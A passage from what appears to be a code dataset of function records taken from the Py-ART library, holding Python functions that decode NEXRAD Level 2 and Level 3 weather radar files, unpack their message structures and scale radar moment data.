            return 'B'
    else:
        raise TypeError('Unsupported msg type %s', msg['header']['type'])"
ARM-DOE/pyart,_decompress_records,"def _decompress_records(file_handler):
    """"""
    Decompressed the records from an BZ2 compressed Archive 2 file.
    """"""
    file_handler.seek(0)
    cbuf = file_handler.read()
    decompressor = bz2.BZ2Decompressor()
    skip = _structure_size(VOLUME_HEADER) + CONTROL_WORD_SIZE
    buf = bytearray(decompressor.decompress(cbuf[skip:]))
    while len(decompressor.unused_data):
        cbuf = decompressor.unused_data
        decompressor = bz2.BZ2Decompressor()
        buf += decompressor.decompress(cbuf[CONTROL_WORD_SIZE:])
    return buf[COMPRESSION_RECORD_SIZE:]"
ARM-DOE/pyart,_get_record_from_buf,"def _get_record_from_buf(buf, pos):
    """"""Retrieve and unpack a NEXRAD record from a buffer.""""""
    dic = {'header': _unpack_from_buf(buf, pos, MSG_HEADER)}
    msg_type = dic['header']['type']
    if msg_type == 31:
        new_pos = _get_msg31_from_buf(buf, pos, dic)
    elif msg_type == 5:
        try:
            new_pos = _get_msg5_from_buf(buf, pos, dic)
        except struct.error:
            warnings.warn('Encountered incomplete MSG5. File may be corrupt.', RuntimeWarning)
            new_pos = pos + RECORD_SIZE
    elif msg_type == 29:
        new_pos = _get_msg29_from_buf(pos, dic)
        warnings.warn('Message 29 encountered, not parsing.', RuntimeWarning)
    elif msg_type == 1:
        new_pos = _get_msg1_from_buf(buf, pos, dic)
    else:
        new_pos = pos + RECORD_SIZE
    return (new_pos, dic)"
ARM-DOE/pyart,_get_msg29_from_buf,"def _get_msg29_from_buf(pos, dic):
    msg_size = dic['header']['size']
    if msg_size == 65535:
        msg_size = dic['header']['segments'] << 16 | dic['header']['seg_num']
    msg_header_size = _structure_size(MSG_HEADER)
    new_pos = pos + msg_header_size + msg_size
    return new_pos"
ARM-DOE/pyart,_get_msg31_from_buf,"def _get_msg31_from_buf(buf, pos, dic):
    """"""Retrieve and unpack a MSG31 record from a buffer.""""""
    msg_size = dic['header']['size'] * 2 - 4
    msg_header_size = _structure_size(MSG_HEADER)
    new_pos = pos + msg_header_size + msg_size
    mbuf = buf[pos + msg_header_size:new_pos]
    msg_31_header = _unpack_from_buf(mbuf, 0, MSG_31)
    block_pointers = [v for (k, v) in msg_31_header.items() if k.startswith('block_pointer') and v > 0]
    for block_pointer in block_pointers:
        (block_name, block_dic) = _get_msg31_data_block(mbuf, block_pointer)
        dic[block_name] = block_dic
    dic['msg_header'] = msg_31_header
    return new_pos"
ARM-DOE/pyart,_get_msg31_data_block,"def _get_msg31_data_block(buf, ptr):
    """"""Unpack a msg_31 data block into a dictionary.""""""
    block_name = buf[ptr + 1:ptr + 4].decode('ascii').strip()
    if block_name == 'VOL':
        dic = _unpack_from_buf(buf, ptr, VOLUME_DATA_BLOCK)
    elif block_name == 'ELV':
        dic = _unpack_from_buf(buf, ptr, ELEVATION_DATA_BLOCK)
    elif block_name == 'RAD':
        dic = _unpack_from_buf(buf, ptr, RADIAL_DATA_BLOCK)
    elif block_name in ['REF', 'VEL', 'SW', 'ZDR', 'PHI', 'RHO', 'CFP']:
        dic = _unpack_from_buf(buf, ptr, GENERIC_DATA_BLOCK)
        ngates = dic['ngates']
        ptr2 = ptr + _structure_size(GENERIC_DATA_BLOCK)
        if dic['word_size'] == 16:
            data = np.frombuffer(buf[ptr2:ptr2 + ngates * 2], '>u2')
        elif dic['word_size'] == 8:
            data = np.frombuffer(buf[ptr2:ptr2 + ngates], '>u1')
        else:
            warnings.warn('Unsupported bit size: %s. Returning array dtype ""B""', dic['word_size'])
        dic['data'] = data
    else:
        dic = {}
    return (block_name, dic)"
ARM-DOE/pyart,_get_msg1_from_buf,"def _get_msg1_from_buf(buf, pos, dic):
    """"""Retrieve and unpack a MSG1 record from a buffer.""""""
    msg_header_size = _structure_size(MSG_HEADER)
    msg1_header = _unpack_from_buf(buf, pos + msg_header_size, MSG_1)
    dic['msg_header'] = msg1_header
    sur_nbins = int(msg1_header['sur_nbins'])
    doppler_nbins = int(msg1_header['doppler_nbins'])
    sur_step = int(msg1_header['sur_range_step'])
    doppler_step = int(msg1_header['doppler_range_step'])
    sur_first = int(msg1_header['sur_range_first'])
    doppler_first = int(msg1_header['doppler_range_first'])
    if doppler_first > 2 ** 15:
        doppler_first = doppler_first - 2 ** 16
    if msg1_header['sur_pointer']:
        offset = pos + msg_header_size + msg1_header['sur_pointer']
        data = np.frombuffer(buf[offset:offset + sur_nbins], '>u1')
        dic['REF'] = {'ngates': sur_nbins, 'gate_spacing': sur_step, 'first_gate': sur_first, 'data': data, 'scale': 2.0, 'offset': 66.0}
    if msg1_header['vel_pointer']:
        offset = pos + msg_header_size + msg1_header['vel_pointer']
        data = np.frombuffer(buf[offset:offset + doppler_nbins], '>u1')
        dic['VEL'] = {'ngates': doppler_nbins, 'gate_spacing': doppler_step, 'first_gate': doppler_first, 'data': data, 'scale': 2.0, 'offset': 129.0}
        if msg1_header['doppler_resolution'] == 4:
            dic['VEL']['scale'] = 1.0
    if msg1_header['width_pointer']:
        offset = pos + msg_header_size + msg1_header['width_pointer']
        data = np.frombuffer(buf[offset:offset + doppler_nbins], '>u1')
        dic['SW'] = {'ngates': doppler_nbins, 'gate_spacing': doppler_step, 'first_gate': doppler_first, 'data': data, 'scale': 2.0, 'offset': 129.0}
    return pos + RECORD_SIZE"
ARM-DOE/pyart,_get_msg5_from_buf,"def _get_msg5_from_buf(buf, pos, dic):
    """"""Retrieve and unpack a MSG1 record from a buffer.""""""
    msg_header_size = _structure_size(MSG_HEADER)
    msg5_header_size = _structure_size(MSG_5)
    msg5_elev_size = _structure_size(MSG_5_ELEV)
    dic['msg5_header'] = _unpack_from_buf(buf, pos + msg_header_size, MSG_5)
    dic['cut_parameters'] = []
    for i in range(dic['msg5_header']['num_cuts']):
        pos2 = pos + msg_header_size + msg5_header_size + msg5_elev_size * i
        dic['cut_parameters'].append(_unpack_from_buf(buf, pos2, MSG_5_ELEV))
    return pos + RECORD_SIZE"
ARM-DOE/pyart,_structure_size,"def _structure_size(structure):
    """"""Find the size of a structure in bytes.""""""
    return struct.calcsize('>' + ''.join([i[1] for i in structure]))"
ARM-DOE/pyart,_unpack_from_buf,"def _unpack_from_buf(buf, pos, structure):
    """"""Unpack a structure from a buffer.""""""
    size = _structure_size(structure)
    return _unpack_structure(buf[pos:pos + size], structure)"
ARM-DOE/pyart,_unpack_structure,"def _unpack_structure(string, structure):
    """"""Unpack a structure from a string.""""""
    fmt = '>' + ''.join([i[1] for i in structure])
    lst = struct.unpack(fmt, string)
    return dict(zip([i[0] for i in structure], lst))"
ARM-DOE/pyart,__init__,"def __init__(self, filename):
    """"""initalize the object.""""""
    if hasattr(filename, 'read'):
        fh = filename
    else:
        fh = open(filename, 'rb')
    size = _structure_size(VOLUME_HEADER)
    self.volume_header = _unpack_structure(fh.read(size), VOLUME_HEADER)
    compression_record = fh.read(COMPRESSION_RECORD_SIZE)
    compression_slice = slice(CONTROL_WORD_SIZE, CONTROL_WORD_SIZE + 2)
    compression_or_ctm_info = compression_record[compression_slice]
    if compression_or_ctm_info == b'BZ':
        buf = _decompress_records(fh)
    elif compression_or_ctm_info in (b'\x00\x00', b'\t\x80'):
        buf = fh.read()
    else:
        raise OSError('unknown compression record')
    self._fh = fh
    self._records = []
    buf_length = len(buf)
    pos = 0
    while pos < buf_length:
        (pos, dic) = _get_record_from_buf(buf, pos)
        self._records.append(dic)
    self.radial_records = [r for r in self._records if r['header']['type'] == 31]
    self._msg_type = '31'
    if len(self.radial_records) == 0:
        self.radial_records = [r for r in self._records if r['header']['type'] == 1]
        self._msg_type = '1'
    if len(self.radial_records) == 0:
        raise ValueError('No MSG31 records found, cannot read file')
    elev_nums = np.array([m['msg_header']['elevation_number'] for m in self.radial_records])
    self.scan_msgs = [np.where(elev_nums == i + 1)[0] for i in range(elev_nums.max())]
    self.nscans = len(self.scan_msgs)
    msg_5 = [r for r in self._records if r['header']['type'] == 5]
    if len(msg_5):
        self.vcp = msg_5[0]
    else:
        warnings.warn('No MSG5 detected. Setting to meaningless data. Rethink your life choices and be ready for errors.Specifically fixed angle data will be missing')
        self.vcp = None
    return"
ARM-DOE/pyart,close,"def close(self):
    """"""Close the file.""""""
    self._fh.close()"
ARM-DOE/pyart,location,"def location(self):
    """"""
        Find the location of the radar.

        Returns all zeros if location is not available.

        Returns
        -------
        latitude : float
            Latitude of the radar in degrees.
        longitude : float
            Longitude of the radar in degrees.
        height : int
            Height of radar and feedhorn in meters above mean sea level.

        """"""
    if self._msg_type == '31':
        dic = self.radial_records[0]['VOL']
        height = dic['height'] + dic['feedhorn_height']
        return (dic['lat'], dic['lon'], height)
    else:
        return (0.0, 0.0, 0.0)"
ARM-DOE/pyart,scan_info,"def scan_info(self, scans=None):
    """"""
        Return a list of dictionaries with scan information.

        Parameters
        ----------
        scans : list ot None
            Scans (0 based) for which ray (radial) azimuth angles will be
            retrieved.  None (the default) will return the angles for all
            scans in the volume.

        Returns
        -------
        scan_info : list, optional
            A list of the scan performed with a dictionary with keys
            'moments', 'ngates', 'nrays', 'first_gate' and 'gate_spacing'
            for each scan.  The 'moments', 'ngates', 'first_gate', and
            'gate_spacing' keys are lists of the NEXRAD moments and gate
            information for that moment collected during the specific scan.
            The 'nrays' key provides the number of radials collected in the
            given scan.

        """"""
    info = []
    if scans is None:
        scans = range(self.nscans)
    for scan in scans:
        nrays = self.get_nrays(scan)
        if nrays < 2:
            self.nscans -= 1
            continue
        msg31_number = self.scan_msgs[scan][0]
        msg = self.radial_records[msg31_number]
        nexrad_moments = ['REF', 'VEL', 'SW', 'ZDR', 'PHI', 'RHO', 'CFP']
        moments = [f for f in nexrad_moments if f in msg]
        ngates = [msg[f]['ngates'] for f in moments]
        gate_spacing = [msg[f]['gate_spacing'] for f in moments]
        first_gate = [msg[f]['first_gate'] for f in moments]
        info.append({'nrays': nrays, 'ngates': ngates, 'gate_spacing': gate_spacing, 'first_gate': first_gate, 'moments': moments})
    return info"
ARM-DOE/pyart,get_vcp_pattern,"def get_vcp_pattern(self):
    """"""
        Return the numerical volume coverage pattern (VCP) or None if unknown.
        """"""
    if self.vcp is None:
        return None
    else:
        return self.vcp['msg5_header']['pattern_number']"
ARM-DOE/pyart,get_nrays,"def get_nrays(self, scan):
    """"""
        Return the number of rays in a given scan.

        Parameters
        ----------
        scan : int
            Scan of interest (0 based).

        Returns
        -------
        nrays : int
            Number of rays (radials) in the scan.

        """"""
    return len(self.scan_msgs[scan])"
ARM-DOE/pyart,get_range,"def get_range(self, scan_num, moment):
    """"""
        Return an array of gate ranges for a given scan and moment.

        Parameters
        ----------
        scan_num : int
            Scan number (0 based).
        moment : 'REF', 'VEL', 'SW', 'ZDR', 'PHI', 'RHO', or 'CFP'
            Moment of interest.

        Returns
        -------
        range : ndarray
            Range in meters from the antenna to the center of gate (bin).

        """"""
    dic = self.radial_records[self.scan_msgs[scan_num][0]][moment]
    ngates = dic['ngates']
    first_gate = dic['first_gate']
    gate_spacing = dic['gate_spacing']
    return np.arange(ngates) * gate_spacing + first_gate"
ARM-DOE/pyart,_msg_nums,"def _msg_nums(self, scans):
    """"""Find the all message number for a list of scans.""""""
    return np.concatenate([self.scan_msgs[i] for i in scans])"
ARM-DOE/pyart,_radial_array,"def _radial_array(self, scans, key):
    """"""
        Return an array of radial header elements for all rays in scans.
        """"""
    msg_nums = self._msg_nums(scans)
    temp = [self.radial_records[i]['msg_header'][key] for i in msg_nums]
    return np.array(temp)"
ARM-DOE/pyart,_radial_sub_array,"def _radial_sub_array(self, scans, key):
    """"""
        Return an array of RAD or msg_header elements for all rays in scans.
        """"""
    msg_nums = self._msg_nums(scans)
    if self._msg_type == '31':
        tmp = [self.radial_records[i]['RAD'][key] for i in msg_nums]
    else:
        tmp = [self.radial_records[i]['msg_header'][key] for i in msg_nums]
    return np.array(tmp)"
ARM-DOE/pyart,get_times,"def get_times(self, scans=None):
    """"""
        Retrieve the times at which the rays were collected.

        Parameters
        ----------
        scans : list or None
            Scans (0-based) to retrieve ray (radial) collection times from.
            None (the default) will return the times for all scans in the
            volume.

        Returns
        -------
        time_start : Datetime
            Initial time.
        time : ndarray
            Offset in seconds from the initial time at which the rays
            in the requested scans were collected.

        """"""
    if scans is None:
        scans = range(self.nscans)
    days = self._radial_array(scans, 'collect_date')
    secs = self._radial_array(scans, 'collect_ms') / 1000.0
    offset = timedelta(days=int(days[0]) - 1, seconds=int(secs[0]))
    time_start = datetime(1970, 1, 1) + offset
    time = secs - int(secs[0]) + (days - days[0]) * 86400
    return (time_start, time)"
ARM-DOE/pyart,get_azimuth_angles,"def get_azimuth_angles(self, scans=None):
    """"""
        Retrieve the azimuth angles of all rays in the requested scans.

        Parameters
        ----------
        scans : list ot None
            Scans (0 based) for which ray (radial) azimuth angles will be
            retrieved. None (the default) will return the angles for all
            scans in the volume.

        Returns
        -------
        angles : ndarray
            Azimuth angles in degress for all rays in the requested scans.

        """"""
    if scans is None:
        scans = range(self.nscans)
    if self._msg_type == '1':
        scale = 180 / (4096 * 8.0)
    else:
        scale = 1.0
    return self._radial_array(scans, 'azimuth_angle') * scale"
ARM-DOE/pyart,get_elevation_angles,"def get_elevation_angles(self, scans=None):
    """"""
        Retrieve the elevation angles of all rays in the requested scans.

        Parameters
        ----------
        scans : list or None
            Scans (0 based) for which ray (radial) azimuth angles will be
            retrieved. None (the default) will return the angles for
            all scans in the volume.

        Returns
        -------
        angles : ndarray
            Elevation angles in degress for all rays in the requested scans.

        """"""
    if scans is None:
        scans = range(self.nscans)
    if self._msg_type == '1':
        scale = 180 / (4096 * 8.0)
    else:
        scale = 1.0
    return self._radial_array(scans, 'elevation_angle') * scale"
ARM-DOE/pyart,get_target_angles,"def get_target_angles(self, scans=None):
    """"""
        Retrieve the target elevation angle of the requested scans.

        Parameters
        ----------
        scans : list or None
            Scans (0 based) for which the target elevation angles will be
            retrieved. None (the default) will return the angles for all
            scans in the volume.

        Returns
        -------
        angles : ndarray
            Target elevation angles in degress for the requested scans.

        """"""
    if scans is None:
        scans = range(self.nscans)
    if self._msg_type == '31':
        if self.vcp is not None:
            cut_parameters = self.vcp['cut_parameters']
        else:
            cut_parameters = [{'elevation_angle': 0.0}] * self.nscans
        scale = 360.0 / 65536.0
        return np.array([cut_parameters[i]['elevation_angle'] * scale for i in scans], dtype='float32')
    else:
        scale = 180 / (4096 * 8.0)
        msgs = [self.radial_records[self.scan_msgs[i][0]] for i in scans]
        return np.round(np.array([m['msg_header']['elevation_angle'] * scale for m in msgs], dtype='float32'), 1)"
ARM-DOE/pyart,get_nyquist_vel,"def get_nyquist_vel(self, scans=None):
    """"""
        Retrieve the Nyquist velocities of the requested scans.

        Parameters
        ----------
        scans : list or None
            Scans (0 based) for which the Nyquist velocities will be
            retrieved. None (the default) will return the velocities for all
            scans in the volume.

        Returns
        -------
        velocities : ndarray
            Nyquist velocities (in m/s) for the requested scans.

        """"""
    if scans is None:
        scans = range(self.nscans)
    return self._radial_sub_array(scans, 'nyquist_vel') * 0.01"
ARM-DOE/pyart,get_unambigous_range,"def get_unambigous_range(self, scans=None):
    """"""
        Retrieve the unambiguous range of the requested scans.

        Parameters
        ----------
        scans : list or None
            Scans (0 based) for which the unambiguous range will be retrieved.
            None (the default) will return the range for all scans in the
            volume.

        Returns
        -------
        unambiguous_range : ndarray
            Unambiguous range (in meters) for the requested scans.

        """"""
    if scans is None:
        scans = range(self.nscans)
    return self._radial_sub_array(scans, 'unambig_range') * 100.0"
ARM-DOE/pyart,get_data,"def get_data(self, moment, max_ngates, scans=None, raw_data=False):
    """"""
        Retrieve moment data for a given set of scans.

        Masked points indicate that the data was not collected, below
        threshold or is range folded.

        Parameters
        ----------
        moment : 'REF', 'VEL', 'SW', 'ZDR', 'PHI', 'RHO', or 'CFP'
            Moment for which to to retrieve data.
        max_ngates : int
            Maximum number of gates (bins) in any ray.
            requested.
        raw_data : bool
            True to return the raw data, False to perform masking as well as
            applying the appropiate scale and offset to the data.  When
            raw_data is True values of 1 in the data likely indicate that
            the gate was not present in the sweep, in some cases in will
            indicate range folded data.
        scans : list or None.
            Scans to retrieve data from (0 based). None (the default) will
            get the data for all scans in the volume.

        Returns
        -------
        data : ndarray

        """"""
    if scans is None:
        scans = range(self.nscans)
    msg_nums = self._msg_nums(scans)
    nrays = len(msg_nums)
    set_datatype = False
    data = np.ones((nrays, max_ngates), '>B')
    for (i, msg_num) in enumerate(msg_nums):
        msg = self.radial_records[msg_num]
        if moment not in msg.keys():
            continue
        if not set_datatype:
            data = data.astype('>' + _bits_to_code(msg, moment))
            set_datatype = True
        ngates = min(msg[moment]['ngates'], max_ngates, len(msg[moment]['data']))
        data[i, :ngates] = msg[moment]['data'][:ngates]
    if raw_data:
        return data
    for scan in scans:
        msg_num = self.scan_msgs[scan][0]
        msg = self.radial_records[msg_num]
        if moment in msg.keys():
            offset = np.float32(msg[moment]['offset'])
            scale = np.float32(msg[moment]['scale'])
            mask = data <= 1
            scaled_data = (data - offset) / scale
            return np.ma.array(scaled_data, mask=mask)
    return np.ma.masked_less_equal(data, 1)"
ARM-DOE/pyart,_datetime_from_mdate_mtime,"def _datetime_from_mdate_mtime(mdate, mtime):
    """"""Returns a datetime for a given message date and time.""""""
    epoch = datetime.utcfromtimestamp(0)
    return epoch + timedelta(days=mdate - 1, seconds=mtime)"
ARM-DOE/pyart,_structure_size,"def _structure_size(structure):
    """"""Find the size of a structure in bytes.""""""
    return struct.calcsize('>' + ''.join([i[1] for i in structure]))"
ARM-DOE/pyart,_unpack_from_buf,"def _unpack_from_buf(buf, pos, structure):
    """"""Unpack a structure from a buffer.""""""
    size = _structure_size(structure)
    return _unpack_structure(buf[pos:pos + size], structure)"
ARM-DOE/pyart,_unpack_structure,"def _unpack_structure(string, structure):
    """"""Unpack a structure from a string""""""
    fmt = '>' + ''.join([i[1] for i in structure])
    lst = struct.unpack(fmt, string)
    return dict(zip([i[0] for i in structure], lst))"
ARM-DOE/pyart,nexrad_level3_message_code,"def nexrad_level3_message_code(filename):
    """"""Return the message (product) code for a NEXRAD Level 3 file.""""""
    fhl = open(filename)
    buf = fhl.read(48)
    fhl.close()
    msg_header = _unpack_from_buf(buf, 30, MESSAGE_HEADER)
    return msg_header['code']"
ARM-DOE/pyart,_int16_to_float16,"def _int16_to_float16(val):
    """"""Convert a 16 bit interger into a 16 bit float.""""""
    sign = (val & 32768) / 32768
    exponent = (val & 31744) / 1024
    fraction = val & 1023
    if exponent == 0:
        return (-1) ** sign * 2 * (0 + fraction / 2 ** 10.0)
    else:
        return (-1) ** sign * 2 ** (exponent - 16) * (1 + fraction / 2 ** 10.0)"
ARM-DOE/pyart,__init__,"def __init__(self, filename):
    """"""initalize the object.""""""
    if hasattr(filename, 'read'):
        fhandle = filename
    else:
        fhandle = open(filename, 'rb')
    buf = fhandle.read()
    self._fh = fhandle
    record_padding = buf.find(b'SDUS')
    if record_padding == -1:
        raise ValueError('Not a valid NEXRAD Level 3 file.')
    self.text_header = buf[:30 + record_padding]
    bpos = 30 + record_padding
    self.msg_header = _unpack_from_buf(buf, bpos, MESSAGE_HEADER)
    if self.msg_header['code'] not in SUPPORTED_PRODUCTS:
        code = self.msg_header['code']
        raise NotImplementedError('Level3 product with code %i is not supported' % code)
    bpos += 18
    self.prod_descr = _unpack_from_buf(buf, bpos, PRODUCT_DESCRIPTION)
    bpos += 102
    ver = self.prod_descr['version']
    supp_ver = SUPPORTED_VERSION_NUMBERS[self.msg_header['code']]
    if ver > supp_ver:
        warnings.warn('Radar product version is %d. Py-ART implementation             supports max version of %d. Most recent product version has not             yet been implemented/tested.' % (ver, supp_ver), UserWarning)
    if buf[bpos:bpos + 2] == b'BZ':
        buf2 = bz2.decompress(buf[bpos:])
    else:
        buf2 = buf[bpos:]
    self.symbology_header = _unpack_from_buf(buf2, 0, SYMBOLOGY_HEADER)
    packet_code = struct.unpack('>h', buf2[16:18])[0]
    assert packet_code in SUPPORTED_PACKET_CODES
    bpos = 16
    if packet_code == 28:
        self._read_symbology_block_28(buf2, bpos, packet_code)
    else:
        self._read_symbology_block(buf2, bpos, packet_code)"
ARM-DOE/pyart,close,"def close(self):
    """"""Close the file.""""""
    self._fh.close()"
ARM-DOE/pyart,_read_symbology_block,"def _read_symbology_block(self, buf2, pos, packet_code):
    self.packet_header = _unpack_from_buf(buf2, 16, RADIAL_PACKET_HEADER)
    self.radial_headers = []
    nbins = self.packet_header['nbins']
    nradials = self.packet_header['nradials']
    nbytes = _unpack_from_buf(buf2, 30, RADIAL_HEADER)['nbytes']
    if packet_code == 16 and nbytes != nbins:
        nbins = nbytes
    self.raw_data = np.empty((nradials, nbins), dtype='uint8')
    pos = 30
    for radial in self.raw_data:
        radial_header = _unpack_from_buf(buf2, pos, RADIAL_HEADER)
        pos += 6
        if packet_code == 16:
            radial[:] = np.frombuffer(buf2[pos:pos + nbins], '>u1')
            pos += radial_header['nbytes']
        else:
            assert packet_code == AF1F
            rle_size = radial_header['nbytes'] * 2
            rle = np.frombuffer(buf2[pos:pos + rle_size], dtype='>u1')
            colors = np.bitwise_and(rle, 15)
            runs = np.bitwise_and(rle, 240) // 16
            radial[:] = np.repeat(colors, runs)
            pos += rle_size
        self.radial_headers.append(radial_header)"
ARM-DOE/pyart,_read_symbology_block_28,"def _read_symbology_block_28(self, buf2, bpos, packet_code):
    """"""Read symbology block for Packet Code 28 (Product 176).""""""
    self.packet_header = _unpack_from_buf(buf2, bpos, GEN_DATA_PACK_HEADER)
    bpos += 8
    num_bytes = self.packet_header['num_bytes']
    hunk = buf2[bpos:bpos + num_bytes]
    xdrparser = Level3XDRParser(hunk)
    self.gen_data_pack = xdrparser(packet_code)
    self.packet_header['nradials'] = len(self.gen_data_pack['components'].radials)
    nradials = self.packet_header['nradials']
    self.packet_header['nbins'] = self.gen_data_pack['components'].radials[0].num_bins
    nbins = self.packet_header['nbins']
    self.packet_header['first_bin'] = self.gen_data_pack['components'].first_gate
    self.packet_header['range_scale'] = 1000
    self.azimuths = [rad.azimuth for rad in self.gen_data_pack['components'].radials]
    self.raw_data = np.empty((nradials, nbins), dtype='uint16')
    for i in range(0, nradials):
        self.raw_data[i, :] = self.gen_data_pack['components'].radials[i].data"
ARM-DOE/pyart,get_location,"def get_location(self):
    """"""Return the latitude, longitude and height of the radar.""""""
    latitude = self.prod_descr['latitude'] * 0.001
    longitude = self.prod_descr['longitude'] * 0.001
    height = self.prod_descr['height']
    return (latitude, longitude, height)"
ARM-DOE/pyart,get_azimuth,"def get_azimuth(self):
    """"""Return an array of starting azimuth angles in degrees.""""""
    if self.packet_header['packet_code'] == 28:
        azimuths = self.azimuths
    else:
        azimuths = [d['angle_start'] * 0.1 for d in self.radial_headers]
    return np.array(azimuths, dtype='float32')"
ARM-DOE/pyart,get_range,"def get_range(self):
    """"""Return an array of gate range spacing in meters.""""""
    nbins = self.raw_data.shape[1]
    first_bin = self.packet_header['first_bin']
    range_scale = self.packet_header['range_scale'] * PRODUCT_RANGE_RESOLUTION[self.msg_header['code']]
    return np.arange(nbins, dtype='float32') * range_scale + first_bin"
ARM-DOE/pyart,get_elevation,"def get_elevation(self):
    """"""Return the sweep elevation angle in degrees.""""""
    hw30 = self.prod_descr['halfwords_30']
    if self.msg_header['code'] in ELEVATION_ANGLE:
        elevation = struct.unpack('>h', hw30)[0] * 0.1
    else:
        elevation = 0.0
    return elevation"
ARM-DOE/pyart,get_volume_start_datetime,"def get_volume_start_datetime(self):
    """"""Return a datetime of the start of the radar volume.""""""
    return _datetime_from_mdate_mtime(self.prod_descr['vol_scan_date'], self.prod_descr['vol_scan_time'])"
ARM-DOE/pyart,get_data,"def get_data(self):
    """"""Return a masked array containing the field data.""""""
    msg_code = self.msg_header['code']
    threshold_data = self.prod_descr['threshold_data']
    if msg_code in _8_OR_16_LEVELS:
        mdata = self._get_data_8_or_16_levels()
    elif msg_code in [134]:
        mdata = self._get_data_msg_134()
    elif msg_code in [94, 99, 182, 186]:
        (hw31, hw32) = np.frombuffer(threshold_data[:4], '>i2')
        data = (self.raw_data - 2) * (hw32 / 10.0) + hw31 / 10.0
        mdata = np.ma.array(data, mask=self.raw_data < 2)
    elif msg_code in [32]:
        (hw31, hw32) = np.frombuffer(threshold_data[:4], '>i2')
        data = self.raw_data * (hw32 / 10.0) + hw31 / 10.0
        mdata = np.ma.array(data, mask=self.raw_data < 2)
    elif msg_code in [138]:
        (hw31, hw32) = np.frombuffer(threshold_data[:4], '>i2')
        data = self.raw_data * (hw32 / 100.0) + hw31 / 100.0
        mdata = np.ma.array(data)
    elif msg_code in [159, 161, 163]:
        (scale, offset) = np.frombuffer(threshold_data[:8], '>f4')
        data = (self.raw_data - offset) / scale
        mdata = np.ma.array(data, mask=self.raw_data < 2)
    elif msg_code in [170, 172, 173, 174, 175]:
        (scale, offset) = np.frombuffer(threshold_data[:8], '>f4')
        data = (self.raw_data - offset) / scale * 0.01
        mdata = np.ma.array(data, mask=self.raw_data < 1)
    elif msg_code in [176]:
        (scale, offset) = np.frombuffer(threshold_data[:8], '>f4')
        data = (self.raw_data - offset) / scale
        mdata = np.ma.array(data, mask=self.raw_data < 1)
    elif msg_code in [165, 177]:
        mdata = np.ma.masked_equal(self.raw_data, 0)
    elif msg_code in [135]:
        mdata = np.ma.array(self.raw_data - 2, mask=self.raw_data <= 1)
        mdata[self.raw_data >= 128] -= np.uint8(128)
    else:
        assert msg_code in [34]
        mdata = np.ma.array(self.raw_data.copy())
    return mdata.astype('float32')"
ARM-DOE/pyart,_get_data_8_or_16_levels,"def _get_data_8_or_16_levels(self):
    """"""Return a masked array for products with 8 or 16 data levels.""""""
    thresh = np.frombuffer(self.prod_descr['threshold_data'], '>B')
    flags = thresh[::2]
    values = thresh[1::2]
    sign = np.choose(np.bitwise_and(flags, 1), [1, -1])
    bad = np.bitwise_and(flags, 128) == 128
    scale = 1.0
    if flags[0] & 2 ** 5:
        scale = 1 / 20.0
    if flags[0] & 2 ** 4:
        scale = 1 / 10.0
    data_levels = values * sign * scale
    data_levels[bad] = -999
    data = np.choose(self.raw_data, data_levels)
    mdata = np.ma.masked_equal(data, -999)
    return mdata"
ARM-DOE/pyart,_get_data_msg_134,"def _get_data_msg_134(self):
    """"""Return a masked array for product with message code 134.""""""
    (hw31, hw32, hw33, hw34, hw35) = np.frombuffer(self.prod_descr['threshold_data'][:10], '>i2')
    linear_scale = _int16_to_float16(hw31)
    linear_offset = _int16_to_float16(hw32)
    log_start = hw33
    log_scale = _int16_to_float16(hw34)
    log_offset = _int16_to_float16(hw35)
    data = np.zeros(self.raw_data.shape, dtype=np.float32)
    lin = self.raw_data < log_start
    data[lin] = (self.raw_data[lin] - linear_offset) / linear_scale
    log = self.raw_data >= log_start
    data[log] = np.exp((self.raw_data[log] - log_offset) / log_scale)
    mdata = np.ma.masked_array(data, mask=self.raw_data < 2)
    return mdata"
ARM-DOE/pyart,__call__,"def __call__(self, packet_code):
    """"""Perform the actual unpacking.""""""
    xdr = {}
    if packet_code == 28:
        xdr.update(self._unpack_prod_desc())
    else:
        raise NotImplementedError('Unknown XDR Component: %d' % packet_code)
    self.done()
    return xdr"
ARM-DOE/pyart,unpack_string,"def unpack_string(self):
    """"""Unpack the internal data as a string.""""""
    return Unpacker.unpack_string(self).decode('ascii')"
ARM-DOE/pyart,_unpack_prod_desc,"def _unpack_prod_desc(self):
    xdr = {}
    xdr['name'] = self.unpack_string()
    xdr['description'] = self.unpack_string()
    xdr['code'] = self.unpack_int()
    xdr['type'] = self.unpack_int()
    xdr['prod_time'] = self.unpack_uint()
    xdr['radar_name'] = self.unpack_string()
    xdr['latitude'] = self.unpack_float()
    xdr['longitude'] = self.unpack_float()
    xdr['height'] = self.unpack_float()
    xdr['vol_time'] = self.unpack_uint()
    xdr['el_time'] = self.unpack_uint()
    xdr['el_angle'] = self.unpack_float()
    xdr['vol_num'] = self.unpack_int()
    xdr['op_mode'] = self.unpack_int()
    xdr['vcp_num'] = self.unpack_int()
    xdr['el_num'] = self.unpack_int()
    xdr['compression'] = self.unpack_int()
    xdr['uncompressed_size'] = self.unpack_int()
    xdr['parameters'] = self._unpack_parameters()
    xdr['components'] = self._unpack_components()
    return xdr"
ARM-DOE/pyart,_unpack_parameters,"def _unpack_parameters(self):
    num = self.unpack_int()
    self.unpack_int()
    if num == 0:
        return None
    ret = []
    for i in range(num):
        ret.append((self.unpack_string(), self.unpack_string()))
        if i < num - 1:
            self.unpack_int()
    if num == 1:
        ret = ret[0]
    return ret"
ARM-DOE/pyart,_unpack_components,"def _unpack_components(self):
    num = self.unpack_int()
    self.unpack_int()
    ret = []
    for i in range(num):
        try:
            code = self.unpack_int()
            ret.append(self._component_lookup[code](self))
            if i < num - 1:
                self.unpack_int()
        except KeyError:
            raise NotImplementedError('Unknown XDR Component: %d' % code)
            break
    if num == 1:
        ret = ret[0]
    return ret"
ARM-DOE/pyart,_unpack_radial,"def _unpack_radial(self):
    ret = self.radial_fmt(description=self.unpack_string(), gate_width=self.unpack_float(), first_gate=self.unpack_float(), parameters=self._unpack_parameters(), radials=None)
    num_rads = self.unpack_int()
    rads = []
    for _ in range(num_rads):
        rads.append(self.radial_data_fmt(azimuth=self.unpack_float(), elevation=self.unpack_float(), width=self.unpack_float(), num_bins=self.unpack_int(), attributes=self.unpack_string(), data=self.unpack_array(self.unpack_int)))
    return ret._replace(radials=rads)"
ARM-DOE/pyart,_unpack_text,"def _unpack_text(self):
    return self.text_fmt(parameters=self._unpack_parameters(), text=self.unpack_string())"
ARM-DOE/pyart,read_nexrad_level3,"def read_nexrad_level3(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, storage_options={'anon': True}, **kwargs):
